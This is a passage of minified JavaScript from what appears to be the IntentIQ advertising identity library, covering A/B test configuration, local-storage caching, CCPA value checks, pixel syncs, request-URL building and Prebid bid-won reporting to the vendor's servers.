  return e ? (this.hadEidsInLocalStorage = !1, (e.data || this.useLodalData) && (!this.intentIqConfig.isInPassiveMode && this.intentIqConfig.abTesting.currentTestGroup !== this.intentIqConfig.abTesting.groupNames.withoutIIQ || (e.data = {}), !1 === this.useLodalData ? this.intentIqData = e.data : e.data = this.intentIqData, this.intentIqData && this.intentIqData.eids && Array.isArray(this.intentIqData.eids) && (this.hadEidsInLocalStorage = 0 < this.intentIqData.eids.length), this.extractIdentittyModulesIds(), this.fillEidsNames(), this.eidsReceptionsTime = Date.now()), "number" == typeof e.callCount && (this.counters.callCount = e.callCount), "number" == typeof e.failCount && (this.counters.failCount = e.failCount), "number" == typeof e.noDataCounter && (this.counters.noDataCounter = e.noDataCounter), "number" == typeof e.cttl && (this.currentDataTTl = e.cttl, this.logger.info("Custom data TTL loaded from LS, value: " + this.currentDataTTl)), t = this.uspDataObj.getUspValue(), "string" == typeof e.uspapi_value ? (this.currentUspValue = e.uspapi_value, this.logger.info("Got stored CCPA Value: " + this.currentUspValue), this.currentUspValue !== t && (this.currentUspValue = t, this.currentDataTTl = 0, e.cttl = 0, this.shouldCallServer = !0, e.uspapi_value = t, this.logger.info("Reset cttl value"))) : (e.uspapi_value = t, this.currentUspValue = t, this.logger.info("Read CCPA Value from uspapi: " + this.currentUspValue)), e.date && (this.lastDataUpdateDate = e.date, this.shouldCallServer = Date.now() - e.date > this.currentDataTTl), e.ct && (this.intentIqConfig.analytics.clientType = e.clientType), e.adserverDeviceType && (this.intentIqConfig.analytics.adserverDeviceType = e.adserverDeviceType), e.terminationCause && (this.intentIqConfig.analytics.terminationCause = e.terminationCause), e.pidDeterministic && (this.intentIqConfig.analytics.pidDeterministic = e.pidDeterministic), e.siteId && (this.intentIqConfig.analytics.siteId = e.siteId)) : (e = {}, this.shouldCallServer = !0), e;
}, IntentIqObject.prototype.getDataOrCallServerIfNeeded = function (t) {
  try {
    var e;
    return this.intentIqConfig.operationalMode.current === this.intentIqConfig.operationalMode.pixel ? {} : "number" != typeof this.intentIqConfig.partner ? (this.counters.failCount++, this.logger.error("intentIqId requires a valid partner to be defined"), {}) : (this.partnerData = this.loadPartnerData(), this.wasCallFromConstructor ? this.savePartnerDataToLocalStore() : this.wasCallFromConstructor = !0, this.shouldCallServer && !1 === this.useLodalData ? (this.wasServerCalled = !0, e = this.createRequestUrl(!1), this.makeServerRequest(e, !0)) : this.isPrebidConfigurationSet || (this.isPrebidConfigurationSet = !0, this.configurePrebid()), !t || !0 !== t || this.isEmptyObjAndArray(this.intentIqData) && this.shouldCallServer || this.fireCallback(), this.intentIqData || {});
  } catch (t) {
    this.counters.failCount++, this.logger.error("Exception occurred during main logic: " + t), this.savePartnerDataToLocalStore();
  }
  return {};
}, IntentIqObject.prototype.createPixelUrl = function () {
  var t = this.intentIqConfig.iiqPixelServerAddress + "/profiles_engine/ProfilesEngineServlet?at=20&mi=10&secure=1",
    t = (t += "&dpi=" + this.intentIqConfig.partner) + ("&rnd=" + this.getRandom(0, 1e6));
  return t = this.appendFirstPartyDataToUrl(t), t = this.addUniquenessToUrl(t), t = this.addMetaData(t), t = this.appendPartnersFirsyParty(t), t = this.appendReferrerToUrl(t), t += this.version ? "&jsver=" + encodeURIComponent(this.version) : "", t = this.appendABTestingData(t);
}, IntentIqObject.prototype.pixelSync = function () {
  try {
    var t,
      e = parseInt(this.readData(this.intentIqConfig.lsKeys.LAST_SYNC_KEY));
    (!e || Date.now() - e > this.syncRefreshMillis) && (t = this.createPixelUrl(), this.appendImage(t), this.storeData(this.intentIqConfig.lsKeys.LAST_SYNC_KEY, Date.now() + ""));
  } catch (t) {
    this.logger.error("Error adding pixel to DOM " + t);
  }
}, IntentIqObject.prototype.appendImage = function (t) {
  var e;
  this.isDefined(t) && ((e = document.createElement("img")).src = t, e.width = 1, e.height = 1, this.isDefined(document.body) ? document.body.appendChild(e) : window.addEventListener("load", function () {
    try {
      document.body.appendChild(e);
    } catch (t) {
      this.logger.fatal(t);
    }
  }));
}, IntentIqObject.prototype.tryExtractConfiguration = function (t) {
  this.intentIqConfig.abTesting.shouldDiscardServerConfiguration || (this.logger.info("Extracting AB testing parameter"), this.tryExtractABTestingConfiguration(t)), this.logger.info("Extracting monitoring parameter");
}, IntentIqObject.prototype.tryExtractABTestingConfiguration = function (t) {
  var e;
  this.intentIqConfig.paramsNames.abPercentage in t && (e = this.tryParseInt(t[this.intentIqConfig.paramsNames.abPercentage]), this.logger.info("abPercentage received: " + t[this.intentIqConfig.paramsNames.abPercentage]), e !== this.intentIqConfig.abTesting.currentPercentage) && (this.logger.info("abPercentage has changed from:" + this.intentIqConfig.abTesting.currentPercentage + " to:" + t[this.intentIqConfig.paramsNames.abPercentage]), this.intentIqConfig.abTesting.previousPercentage = this.intentIqConfig.abTesting.currentPercentage, this.intentIqConfig.abTesting.currentPercentage = e, this.generateTestGroupAccordingToPercentageAndConfigure(), this.persistABTestingSettingsToLS());
}, IntentIqObject.prototype.configureABTestingForIIQServer = function () {
  this.intentIqConfig.abTesting.currentTestGroup = this.intentIqConfig.abTesting.groupNames.notYetDefined, this.intentIqConfig.abTesting.previousTestGroup = this.intentIqConfig.abTesting.groupNames.notYetDefined, this.intentIqConfig.abTesting.shouldDiscardServerConfiguration = !1, this.intentIqConfig.isInPassiveMode = !1;
}, IntentIqObject.prototype.configureABTestingForGroupA = function () {
  this.intentIqConfig.abTesting.currentTestGroup = this.intentIqConfig.abTesting.groupNames.withIIQ, this.intentIqConfig.abTesting.previousTestGroup = this.intentIqConfig.abTesting.groupNames.notYetDefined, this.intentIqConfig.abTesting.currentPercentage = 100, this.intentIqConfig.abTesting.shouldDiscardServerConfiguration = !0, this.intentIqConfig.isInPassiveMode = !1;
}, IntentIqObject.prototype.configureABTestingForGroupB = function () {
  this.intentIqConfig.abTesting.currentTestGroup = this.intentIqConfig.abTesting.groupNames.withoutIIQ, this.intentIqConfig.abTesting.previousTestGroup = this.intentIqConfig.abTesting.groupNames.notYetDefined, this.intentIqConfig.abTesting.currentPercentage = 0, this.intentIqConfig.abTesting.shouldDiscardServerConfiguration = !0, this.intentIqConfig.isInPassiveMode = !0;
}, IntentIqObject.prototype.configureABTestingForPercentage = function () {
  this.intentIqConfig.abTesting.currentTestGroup = this.intentIqConfig.abTesting.groupNames.notYetDefined, this.intentIqConfig.abTesting.previousTestGroup = this.intentIqConfig.abTesting.groupNames.notYetDefined, this.intentIqConfig.abTesting.shouldDiscardServerConfiguration = !0, this.intentIqConfig.isInPassiveMode = !1;
}, IntentIqObject.prototype.configurationSourceGroupInitilization = function () {
  this.userProvidedConfig && "boolean" == typeof this.userProvidedConfig.disableIIQInThisGroup && (this.intentIqConfig.abTesting.isInTestGroup = !0 === this.userProvidedConfig.disableIIQInThisGroup, !0 === this.userProvidedConfig.disableIIQInThisGroup) ? this.configureABTestingForGroupB() : this.configureABTestingForGroupA();
}, IntentIqObject.prototype.configurationSourcePercentageInitilization = function () {
  switch (this.userProvidedConfig && "number" == typeof this.userProvidedConfig.abPercentage && this.userProvidedConfig.abPercentage < 101 && -1 < this.userProvidedConfig.abPercentage ? this.intentIqConfig.abTesting.userActualPercentage = this.userProvidedConfig.abPercentage : this.intentIqConfig.abTesting.userActualPercentage = -2, this.intentIqConfig.abTesting.userActualPercentage) {
    case 0:
      this.configureABTestingForGroupB();
      break;
    case 100:
    case -2:
      this.configureABTestingForGroupA();
      break;
    default:
      this.configureABTestingForPercentage();
  }
}, IntentIqObject.prototype.abTestingAdvancedConfiguration = function () {
  var t;
  this.intentIqConfig.abTesting.currentTestGroup === this.intentIqConfig.abTesting.groupNames.notYetDefined && (t = this.readData(this.intentIqConfig.lsKeys.abPercentage), isNaN(parseInt(t)) || (this.intentIqConfig.abTesting.currentPercentage = Number(t)), null != (t = this.readData(this.intentIqConfig.lsKeys.abGroup)) && (this.intentIqConfig.abTesting.currentTestGroup = t, this.intentIqConfig.isInPassiveMode = this.intentIqConfig.abTesting.currentTestGroup === this.intentIqConfig.abTesting.groupNames.withoutIIQ), this.intentIqConfig.abTesting.configurationSource.currentConfigurationSource === this.intentIqConfig.abTesting.configurationSource.percentage) && this.isDefined(this.intentIqConfig.abTesting.userActualPercentage) && 0 < this.intentIqConfig.abTesting.userActualPercentage && this.intentIqConfig.abTesting.userActualPercentage < 100 && this.intentIqConfig.abTesting.userActualPercentage !== this.intentIqConfig.abTesting.currentPercentage && (this.intentIqConfig.abTesting.previousTestGroup = this.intentIqConfig.abTesting.currentTestGroup, this.intentIqConfig.abTesting.previousPercentage = this.intentIqConfig.abTesting.currentPercentage, this.intentIqConfig.abTesting.currentPercentage = this.intentIqConfig.abTesting.userActualPercentage, this.generateTestGroupAccordingToPercentageAndConfigure(), this.persistABTestingSettingsToLS());
}, IntentIqObject.prototype.initABTestingConfiguration = function () {
  switch (this.intentIqConfig.abTesting.configurationSource.currentConfigurationSource) {
    case this.intentIqConfig.abTesting.configurationSource.group:
      this.configurationSourceGroupInitilization();
      break;
    case this.intentIqConfig.abTesting.configurationSource.percentage:
      this.configurationSourcePercentageInitilization();
      break;
    case this.intentIqConfig.abTesting.configurationSource.iiqserver:
      this.configureABTestingForIIQServer();
      break;
    case this.intentIqConfig.abTesting.configurationSource.disabled:
      this.configureABTestingForGroupA();
  }
  this.abTestingAdvancedConfiguration();
}, IntentIqObject.prototype.generateTestGroupAccordingToPercentageAndConfigure = function () {
  this.generateRandom1to99() < this.intentIqConfig.abTesting.currentPercentage ? (this.intentIqConfig.abTesting.currentTestGroup = this.intentIqConfig.abTesting.groupNames.withIIQ, this.intentIqConfig.isInPassiveMode = !1) : (this.intentIqConfig.abTesting.currentTestGroup = this.intentIqConfig.abTesting.groupNames.withoutIIQ, this.intentIqConfig.isInPassiveMode = !0);
}, IntentIqObject.prototype.persistABTestingSettingsToLS = function () {
  this.isDefined(this.intentIqConfig.abTesting.currentTestGroup) && this.storeData(this.intentIqConfig.lsKeys.abGroup, this.intentIqConfig.abTesting.currentTestGroup), this.isDefined(this.intentIqConfig.abTesting.currentPercentage) && this.storeData(this.intentIqConfig.lsKeys.abPercentage, this.intentIqConfig.abTesting.currentPercentage);
}, IntentIqObject.prototype.getRequest = function (t, e, n, i) {
  var r = new XMLHttpRequest();
  this.intentIqConfig.isAsyncServerRequest ? r.open("GET", t, !0) : r.open("GET", t, !1), t.startsWith("https") && (r.withCredentials = !0), r.timeout = e, r.onreadystatechange = function () {
    n && 4 === r.readyState && n(r.responseText);
  }, r.ontimeout = function () {
    i && i();
  }, r.send();
}, IntentIqObject.prototype.makeServerRequest = function (t, e) {
  var n = this,
    i = !1;
  this.logger.info("Sending request"), this.requestRtt = Date.now(), !0 === e && (this.logger.info("Setting prebid config callback timeout"), this.callbackTimeotID || (this.callbackTimeotID = setTimeout(this.fireCallbackOnRequestTimeout.bind(null, this), this.intentIqConfig.timeoutInMillis))), this.clearCounters(), this.getRequest(t, 9999999, function (t) {
    n.intentIqConfig.analytics.requestRtt = Date.now() - n.requestRtt;
    var e,
      t = n.tryParse(t);
    t && (n.partnerData.date = Date.now(), "pid" in t && (n.intentIqConfig.analytics.profile = t.pid, "ls" in t) && !0 === t.ls && (n.firstPartyData.pid = t.pid, i = !0), "dbsaved" in t && (n.firstPartyData.dbsaved = t.dbsaved, i = !0), "cttl" in t ? (n.currentDataTTl = t.cttl, n.logger.info("Received custom TTL from server, value: " + n.currentDataTTl)) : (n.currentDataTTl = n.intentIqConfig.refreshInMillis, n.logger.info("No custom TTL from server, setting customers value: " + n.currentDataTTl)), "gtwaddr" in t && (n.gatewayServerAddress = t.gtwaddr), "tc" in t && (n.intentIqConfig.analytics.terminationCause = t.tc, "mde" in t) && !0 === t.mde && !1 === n.gatewayWasCalled && !0 === t.mde && 35 === n.intentIqConfig.analytics.terminationCause && "Safari" === n.detectBrowser() && (n.logger.info("VP detected, trying to resolve."), n.gatewayWasCalled = !0, e = n.createRequestUrl(!0), n.makeServerRequest(e += "&gtw=true", !0)), "ct" in t && (n.intentIqConfig.analytics.clientType = t.ct), "adt" in t && (n.intentIqConfig.analytics.adserverDeviceType = t.adt), "sid" in t && (n.intentIqConfig.analytics.siteId = t.sid), "pidd" in t && (n.intentIqConfig.analytics.isProfileDeterministic = t.pidd), n.tryExtractConfiguration(t), "ls" in t && !0 === t.ls && (!n.intentIqConfig.isInPassiveMode && n.intentIqConfig.abTesting.currentTestGroup !== n.intentIqConfig.abTesting.groupNames.withoutIIQ || (t.data = {}), e = n.intentIqData && n.intentIqData.eids && Array.isArray(n.intentIqData.eids) && 0 < n.intentIqData.eids.length, "lsps" in t && !0 !== t.lsps && (!1 !== t.lsps || e) || (n.partnerData.data = t.data, n.intentIqData = t.data, n.extractIdentittyModulesIds(), n.fillEidsNames(), n.eidsReceptionsTime = Date.now())), n.logger.info("Received Data: " + JSON.stringify(t))), i && n.storeData(n.intentIqConfig.lsKeys.FIRST_PARTY_KEY, JSON.stringify(n.firstPartyData)), n.savePartnerDataToLocalStore(), n.isPrebidConfigurationSet || (n.isPrebidConfigurationSet = !0, n.configurePrebid()), n.logger.info("Response from PE parsed, firing callback"), n.fireCallback();
  }, function () {
    n.intentIqConfig.analytics.requestRtt = -1, n.fireCallback();
  });
}, IntentIqObject.prototype.savePartnerDataToLocalStore = function () {
  this.partnerData || (this.partnerData = this.tryParse(this.readData(this.intentIqConfig.lsKeys.PARTNER_DATA_KEY))), this.partnerData && (this.partnerData.callCount = this.counters.callCount, this.partnerData.failCount = this.counters.failCount, this.partnerData.noDataCounter = this.counters.noDataCounter, this.partnerData.cttl = this.currentDataTTl, this.partnerData.clientType = this.intentIqConfig.analytics.clientType, this.partnerData.adserverDeviceType = this.intentIqConfig.analytics.adserverDeviceType, this.partnerData.terminationCause = this.intentIqConfig.analytics.terminationCause, this.partnerData.profile = this.intentIqConfig.analytics.profile, this.partnerData.pidDeterministic = this.intentIqConfig.analytics.pidDeterministic, this.partnerData.siteId = this.intentIqConfig.analytics.siteId, this.storeData(this.intentIqConfig.lsKeys.PARTNER_DATA_KEY, JSON.stringify(this.partnerData)));
}, IntentIqObject.prototype.createRequestUrl = function (t) {
  t = (!0 === t ? this.gatewayServerAddress : this.intentIqConfig.iiqServerAddress) + "/profiles_engine/ProfilesEngineServlet?at=39&mi=10&dpi=" + this.intentIqConfig.partner + "&pt=17&dpn=1", t = (t += this.intentIqConfig.pai ? "&pai=" + encodeURIComponent(this.intentIqConfig.pai) : "") + (this.version ? "&jsver=" + encodeURIComponent(this.version) : "");
  return t = this.appendFirstPartyDataToUrl(t), t = (t += this.appendCounters(t)) + ("&iiqlocalstorageenabled=" + encodeURIComponent(this.hasLocalStorage())), t = this.addUniquenessToUrl(t), t = this.addMetaData(t), t += "&cttl=" + encodeURIComponent(this.currentDataTTl), this.currentUspValue !== this.uspCodes.INITIAL_VALUE && this.currentUspValue !== this.uspCodes.ABSENCE_VALUE && (t += "&pa=" + encodeURIComponent(this.currentUspValue)), t = this.appendPartnersFirsyParty(t), t = this.appendRttDate(t), t = this.appendLastDataUpdateDate(t), t = this.appendWithAnalyticsData(t), t = this.appendReferrerToUrl(t), t = (t += "&japbjs=" + (null !== this.intentIqConfig.pbjs)) + ("&japs=" + this.intentIqConfig.siloEnabled);
}, IntentIqObject.prototype.appendCounters = function (t) {
  return t = "number" == typeof this.counters.callCount ? "&jaesc=" + encodeURIComponent(this.counters.callCount) : "", (t += "number" == typeof this.counters.failCount ? "&jafc=" + encodeURIComponent(this.counters.failCount) : "") + ("number" == typeof this.counters.noDataCounter ? "&jaensc=" + encodeURIComponent(this.counters.noDataCounter) : "");
}, IntentIqObject.prototype.appendLastDataUpdateDate = function (t) {
  return t = isNaN(this.lastDataUpdateDate) ? t : t + "&" + this.intentIqConfig.urlParamsNames.lastDataUpdateDate + "=" + this.lastDataUpdateDate;
}, IntentIqObject.prototype.appendRttDate = function (t) {
  return t = isNaN(this.intentIqConfig.analytics.requestRtt) ? t : t + "&" + this.intentIqConfig.urlParamsNames.requestRtt + "=" + this.intentIqConfig.analytics.requestRtt;
}, IntentIqObject.prototype.appendWithAnalyticsData = function (t) {
  return t = t + "&" + this.intentIqConfig.urlParamsNames.testGroup + "=" + this.intentIqConfig.abTesting.currentTestGroup;
}, IntentIqObject.prototype.appendABTestingData = function (t) {
  try {
    this.isDefined(this.intentIqConfig.abTesting.isInTestGroup) && (t = t + "&" + this.intentIqConfig.urlParamsNames.isInTestGroup + "=" + this.intentIqConfig.abTesting.isInTestGroup), this.isDefined(this.intentIqConfig.abTesting.currentPercentage) && (t = t + "&" + this.intentIqConfig.urlParamsNames.testPercentage + "=" + this.intentIqConfig.abTesting.currentPercentage), this.isDefined(this.intentIqConfig.abTesting.currentTestGroup) && (t = t + "&" + this.intentIqConfig.urlParamsNames.testGroup + "=" + this.intentIqConfig.abTesting.currentTestGroup);
  } catch (t) {
    this.logger.error(t);
  }
  return t;
}, IntentIqObject.prototype.appendPartnersFirsyParty = function (t) {
  try {
    if (-1 === this.intentIqConfig.partnerClientIdType) return t;
    "" !== this.intentIqConfig.partnerClientId && (t = (t = t + "&pcid=" + this.intentIqConfig.partnerClientId) + "&idtype=" + this.intentIqConfig.partnerClientIdType);
  } catch (t) {
    this.logger.error(t);
  }
  return t;
}, IntentIqObject.prototype.addMetaData = function (t) {
  var e = (e = this.intentIqConfig.sourceMetaDataExternal) || this.intentIqConfig.sourceMetaData;
  return isNaN(e) || (t += "&fbp=" + e), t;
}, IntentIqObject.prototype.addUniquenessToUrl = function (t) {
  return t += "&tsrnd=" + Math.floor(1e3 * Math.random()) + "_" + new Date().getTime();
}, IntentIqObject.prototype.appendFirstPartyDataToUrl = function (t) {
  return t = (t = (t = (t = (t += this.isDebug() ? "&ip=" + encodeURIComponent(this.generateRandomUsIp()) : "") + (this.firstPartyData.pid ? "&pid=" + encodeURIComponent(this.firstPartyData.pid) : "")) + (this.firstPartyData.dbsaved ? "&dbsaved=" + encodeURIComponent(this.firstPartyData.dbsaved) : "")) + (this.firstPartyData.pcid ? "&iiqidtype=2&iiqpcid=" + encodeURIComponent(this.firstPartyData.pcid) : "")) + (this.firstPartyData.pcidDate ? "&iiqpciddate=" + encodeURIComponent(this.firstPartyData.pcidDate) : "");
}, IntentIqObject.prototype.appendReferrerToUrl = function (t) {
  return "" !== this.getRefferer() && (t += "&vrref=" + this.getRefferer()), t;
}, IntentIqObject.prototype.getRefferer = function () {
  return "" !== this.intentIqConfig.domainName ? encodeURIComponent(this.intentIqConfig.domainName) : document.referrer && "" !== document.referrer ? encodeURIComponent(document.referrer) : "";
}, IntentIqObject.prototype.updatePrebidObject = function (t, e) {
  try {
    t ? e ? (this.logger.info("String PBJS Reconfiguration"), this.intentIqConfig.subscriptionFlags = {
      bidWon: !1,
      bidRequested: !1,
      beforeBidderHttp: !1,
      auctionInited: !1
    }, this.wasCallbackFired = !1, this.intentIqConfig.pbjs = t, this.intentIqConfig.callback = e, this.subscribeForPrebidEvents(), this.configurePrebid(), this.getDataOrCallServerIfNeeded(!0)) : this.logger.error("CALLBACK not provided while trying to update pbjs objecr refference") : this.logger.fatal("PBJS not provided while trying to update pbjs objecr refference");
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.onBidWonEvent = function (t, e) {
  try {
    var n;
    e.intentIqConfig.pbmonitoring.pbMonitoringEnabled ? e.isInBrowserBlacklist ? e.logger.info("Browser is in blacklist. Skipping report.") : e.isObjectEmpty(t) ? e.logger.info("eventData is empty") : null === (n = e.prepareDataForDelivery(t, null, e)) ? e.logger.info("Failed to prepare bid won data to send, " + e.intentIqConfig.partner) : e.addDataToSendAndInitSender(n, e) : e.logger.info("pbMonitoringEnabled is disabled ");
  } catch (t) {
    e.logger.error(t);
  }
}, IntentIqObject.prototype.addDataToSendAndInitSender = function (t, e) {
  try {
    e.messagesArray.push(t), e.logger.info("New data available to send, " + e.intentIqConfig.partner), e.startSender();
  } catch (t) {
    e.logger.error(t);
  }
}, IntentIqObject.prototype.getDefaultDataObject = function () {
  return {
    inbbl: !1,
    pbjsver: "NR",
    bidderCode: void 0,
    cpm: void 0,
    currency: void 0,
    originalCpm: void 0,
    originalCurrency: void 0,
    status: void 0,
    prebidAuctionId: void 0,
    placementId: void 0,
    biddingPlatformId: void 0,
    partnerAuctionId: "BW",
    abPercentage: void 0,
    abGroup: void 0,
    isInTestGroup: void 0,
    enhanceRequests: void 0,
    hadEids: void 0,
    userPercentage: void 0,
    ABTestingConfigurationSource: void 0,
    jsversion: void 0,
    lateConfiguration: void 0,
    eidsNames: void 0,
    rtt: void 0,
    clientType: void 0,
    AdserverDeviceType: void 0,
    terminationCause: void 0,
    profile: void 0,
    sid: void 0,
    idls: void 0,
    ast: void 0,
    eidt: void 0,
    aid: void 0,
    aeidln: void 0,
    wsrvcll: void 0,
    vrref: void 0,
    pcid: void 0,
    partnerId: void 0
  };
}, IntentIqObject.prototype.fillAgentRuntimeData = function (t, e) {
  var n;
  t.intentIqConfig && t.intentIqConfig.paramsNames ? (e[t.intentIqConfig.paramsNames.partnerId] = t.intentIqConfig.partner, e[t.intentIqConfig.paramsNames.isInBrowserBlacklist] = t.isInBrowserBlacklist, t.version && (e[t.intentIqConfig.paramsNames.jsverion] = t.version), t.intentIqConfig.pbjs && t.intentIqConfig.pbjs.version && (e[t.intentIqConfig.paramsNames.prebidVersion] = t.intentIqConfig.pbjs.version), e[t.intentIqConfig.paramsNames.refferer] = t.getRefferer(), n = t.auctionStartTimeData[e.prebidAuctionId] || 0, e[t.intentIqConfig.paramsNames.wasSubscribedForPrebid] = t.isSubscribedForPrebidEvents, e[t.intentIqConfig.paramsNames.enhanceRequests] = t.intentIqConfig.shouldSetUidsModulesConfig, e[t.intentIqConfig.paramsNames.hadEids] = !(null === t.eidsReceptionsTime || n < t.eidsReceptionsTime), void 0 === t.auctionStartTimeData[e.prebidAuctionId] && (e[t.intentIqConfig.paramsNames.hadEids] = void 0), e[t.intentIqConfig.paramsNames.auctionStartTime] = n, e[t.intentIqConfig.paramsNames.lateConfiguration] = 0 === n ? void 0 : t.configurationTime > n, t.userProvidedConfig && (e[t.intentIqConfig.paramsNames.userActualPercentage] = t.userProvidedConfig.abPercentage, e[t.intentIqConfig.paramsNames.ABTestingConfigurationSource] = t.userProvidedConfig.ABTestingConfigurationSource), t.intentIqConfig.abTesting && (e[t.intentIqConfig.paramsNames.abPercentage] = t.intentIqConfig.abTesting.currentPercentage, e[t.intentIqConfig.paramsNames.abTestGroup] = t.intentIqConfig.abTesting.currentTestGroup, e[t.intentIqConfig.paramsNames.isInTestGroup] = t.intentIqConfig.abTesting.currentTestGroup), 0 !== n && t.configurationTime > n && t.logger.info("Late configuration suspected. Events were missed."), e[t.intentIqConfig.paramsNames.eidsNames] = t.eidsNames, e[t.intentIqConfig.paramsNames.hadEidsInLocalStorage] = t.hadEidsInLocalStorage, e[t.intentIqConfig.paramsNames.eidsReadTime] = t.eidsReceptionsTime, e[t.intentIqConfig.paramsNames.agentId] = t.agentId, e[t.intentIqConfig.paramsNames.auctionEidsLegth] = t.auctionEidsLength[e.prebidAuctionId], e[t.intentIqConfig.paramsNames.wasServerCalled] = t.wasServerCalled, t.intentIqConfig.analytics && (e[t.intentIqConfig.paramsNames.requestRtt] = t.intentIqConfig.analytics.requestRtt, t.intentIqConfig.analytics.requestRtt = 0, t.requestRtt = 0, e[t.intentIqConfig.paramsNames.clientType] = t.intentIqConfig.analytics.clientType, e[t.intentIqConfig.paramsNames.adserverDeviceType] = t.intentIqConfig.analytics.adserverDeviceType, e[t.intentIqConfig.paramsNames.terminationCause] = t.intentIqConfig.analytics.terminationCause, e[t.intentIqConfig.paramsNames.profile] = t.intentIqConfig.analytics.profile, e[t.intentIqConfig.paramsNames.siteId] = t.intentIqConfig.analytics.siteId)) : t.logger.error("agent.intentIqConfig or agent.intentIqConfig.paramsNames was nor initialized on reporting"), t.hasLocalStorage() && null !== (n = t.readData(t.intentIqConfig.lsKeys.FIRST_PARTY_KEY)) && ("pcid" in (n = JSON.parse(n)) && (n = n.pcid), e.pcid = n);
}, IntentIqObject.prototype.fillPartnerReportingData = function (t, e, n) {
  n.bidderCode = t.bidderCode, n.cpm = t.cpm, n.currency = t.currency, n.originalCpm = t.originalCpm, n.originalCurrency = t.originalCurrency, n.status = t.status, n.biddingPlatformId = t.biddingPlatformId, n.prebidAuctionId = t.prebidAuctionId, n.placementId = t.placementId, n.partnerAuctionId = t.partnerAuctionId, e.partnerAuctionIdsArray && e.partnerAuctionIdsArray.push(n.partnerAuctionId);
}, IntentIqObject.prototype.fillPrebidEventData = function (t, e, n) {
  t.bidderCode && (n.bidderCode = t.bidderCode), t.cpm && (n.cpm = t.cpm), t.currency && (n.currency = t.currency), t.originalCpm && (n.originalCpm = t.originalCpm), t.originalCurrency && (n.originalCurrency = t.originalCurrency), t.status && (n.status = t.status), t.auctionId && (n.prebidAuctionId = t.auctionId);
  var i = !1;
  if (t.params && Array.isArray(t.params)) for (var r = 0; r < t.params.length; r++) if (t.params[0].placementId) {
    n.placementId = t.params[0].placementId, i = !0;
    break;
  }
  !1 === i && t.adUnitCode && (n.placementId = t.adUnitCode), n.biddingPlatformId = 1, n.partnerAuctionId = "BW";
}, IntentIqObject.prototype.prepareDataForDelivery = function (t, e, n) {
  try {
    var i = n.getDefaultDataObject(),
      r = (i.prebidAuctionId = e ? e.prebidAuctionId : t.auctionId, n.fillAgentRuntimeData(n, i), e ? n.fillPartnerReportingData(e, n, i) : n.fillPrebidEventData(t, n, i), btoa(JSON.stringify(i)));
    return n.logger.info("Original Data : " + JSON.stringify(i, null, 4)), n.logger.info("Data conversion succeed : " + JSON.stringify(r)), r;
  } catch (t) {
    return n.logger.error("Failed to convert data"), n.logger.error(t), {};
  }
}, IntentIqObject.prototype.startSender = function () {
  try {
    this.logger.info("We have some data to send - starting delayed sender. Delay = " + this.intentIqConfig.messageSendingDelay), this.isDefined(this.delayedSenderTimeouter) && (this.logger.info("Updating sender"), clearTimeout(this.delayedSenderTimeouter)), this.delayedSenderTimeouter = setTimeout(this.dataSender.bind(null, this), this.intentIqConfig.messageSendingDelay);
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.dataSender = function (e) {
  try {
    var t, n, i, r;
    0 == e.messagesArray.length ? e.logger.info("Skipping data send , array is empty") : (t = "GET" === e.intentIqConfig.reportMethod, n = JSON.stringify(e.messagesArray), i = new XMLHttpRequest(), r = e.reportingServerAddress + "/" + e.dataReportingPath + "?pid=" + e.intentIqConfig.partner + "&mct=" + e.messagesArray.length + "&agid=" + e.agentId + (e.firstPartyData && e.firstPartyData.pid ? "&iiqid=" + encodeURIComponent(e.firstPartyData.pcid) : "") + "&jsver=" + e.version + "&vrref=" + e.getRefferer() + "&paucid=" + encodeURIComponent(JSON.stringify(e.partnerAuctionIdsArray)) + "&pa=" + encodeURIComponent(e.currentUspValue), t && (r += "&payload=" + n), r.startsWith("https") && (i.withCredentials = !0), i.open(t ? "GET" : "POST", r, !0), t ? i.setRequestHeader("Content-type", "text/plain") : (i.setRequestHeader("Content-type", "application/json"), i.setRequestHeader("Access-Control-Allow-Origin", "*"), i.setRequestHeader("Access-Control-Allow-Credentials", "true"), i.setRequestHeader("Access-Control-Allow-Methods", "GET,HEAD,OPTIONS,POST,PUT"), i.setRequestHeader("Access-Control-Allow-Headers", "Access-Control-Allow-Headers, Origin,Accept, X-Requested-With, Content-Type, Access-Control-Request-Method, Access-Control-Request-Headers")), e.messagesArray = [], e.partnerAuctionIdsArray = [], i.onreadystatechange = function () {
      4 == i.readyState && 200 == i.status && e.processResponse(i.responseText);
    }, e.logger.info("Trying to send data: "), t ? i.send() : i.send(n));
  } catch (t) {
    e.logger.error(t);
  }
}, IntentIqObject.prototype.processResponse = function (t) {
  try {
    var e;
    this.logger.info("Response received" + JSON.stringify(t)), this.isDefined(t) ? (e = this.tryParse(t), Array.isArray(e) ? 0 === e.length ? this.logger.info("Control array is empty: " + t) : (this.logger.info("Sending new cntroll param for processing: " + JSON.stringify(e[0])), this.tryExtractConfiguration(e[0])) : this.logger.info("Wrong response format (not an array): " + t)) : this.logger.info("Response is empty");
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.reportExternalWin = function (t) {
  try {
    var e, n;
    this.isInBrowserBlacklist ? this.logger.info("Browser is in blacklist. Skipping report.") : (e = new PartnersWinEvent(t), null === (n = this.prepareDataForDelivery(null, e, this)) ? this.logger.info("Failed to prepare bid won data to send, " + this.intentIqConfig.partner) : this.addDataToSendAndInitSender(n, this));
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.tryRegisterForBidRequested = function (e) {
  e.intentIqConfig.pbjs.onEvent("bidRequested", function (t) {
    e.clearDuplictesBeforeRubicon(t, e);
  });
}, IntentIqObject.prototype.clearDuplictesBeforeRubicon = function (t, e) {
  try {
    if (!("rubicon" !== t.bidderCode || t.bids.length < 1) && null != e.intentIqConfig.moduleIds.unifiedeId) {
      var n,
        i = _createForOfIteratorHelper(t.bids);
      try {
        for (i.s(); !(n = i.n()).done;) {
          var r = n.value;
          if (r.userId.tdid && Array.isArray(r.userId.pubProvidedId)) {
            for (var o = 0; o < r.userId.pubProvidedId.length; o++) if ("adserver.org" === r.userId.pubProvidedId[o].source) {
              r.userId.pubProvidedId.splice(o, 1);
              break;
            }
            if (Array.isArray(r.userIdAsEids)) for (var s = 0; s < r.userIdAsEids.length; s++) if ("adserver.org" === r.userIdAsEids[s].source && r.userIdAsEids[s].uids[0].id === e.intentIqConfig.moduleIds.unifiedeId) {
              r.userIdAsEids.splice(s, 1);
              break;
            }
          }
        }
      } catch (t) {
        i.e(t);
      } finally {
